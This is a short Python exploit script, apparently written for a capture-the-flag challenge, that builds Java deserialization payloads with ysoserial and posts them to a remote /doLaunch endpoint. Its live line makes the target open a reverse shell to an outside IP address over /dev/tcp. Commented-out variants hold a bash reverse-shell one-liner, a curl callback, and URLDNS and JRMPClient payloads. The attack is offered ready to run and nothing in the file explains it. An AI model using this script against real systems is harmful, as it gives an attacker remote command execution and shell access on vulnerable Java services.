import time
import os

# gadgets = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
#             'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1',
#             'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
#             'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']
gadgets = ['CommonsCollections2']

# gadgets = ['a']

for gadget in gadgets:
	import requests
	# bash -i >& /dev/tcp/10.0.0.1/4242 0>&1

	# work
	# os.system("(java -jar ysoserial-modified/target/ysoserial-modified.jar  {} 'bash' 'curl 103.214.112.73 2028' | base64 -w 0) > /tmp/gen".format(gadget))
	os.system("(java -jar ysoserial-modified/target/ysoserial-modified.jar  {} 'bash' 'sh -i >& /dev/tcp/103.214.112.73/2028 0>&1' | base64 -w 0) > /tmp/gen".format(gadget))
	# os.system("(java -jar ysoserial-0.0.6-SNAPSHOT-all.jar  URLDNS http://103.214.112.73:2025 | base64 -w 0) | tee /tmp/gen".format(gadget))
	# os.system("(java -jar ysoserial-master-SNAPSHOT.jar JRMPClient '103.214.112.73:2022' | base64 -w 0) | tee /tmp/gen".format(gadget))
	payload = open("/tmp/gen").read()
	print gadget


	burp0_url = "http://159.65.20.140:30457/doLaunch"
	burp0_cookies = {"JSESSIONID": "E1F00E963A7215FA2C668059DCFC3346"}
	burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://159.65.20.140:30457", "Connection": "close", "Referer": "http://159.65.20.140:30457/doLaunch", "Upgrade-Insecure-Requests": "1"}
	burp0_data = {"country": "safasf", "worm": payload}
	r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
	# time.sleep(10)
	# print r.text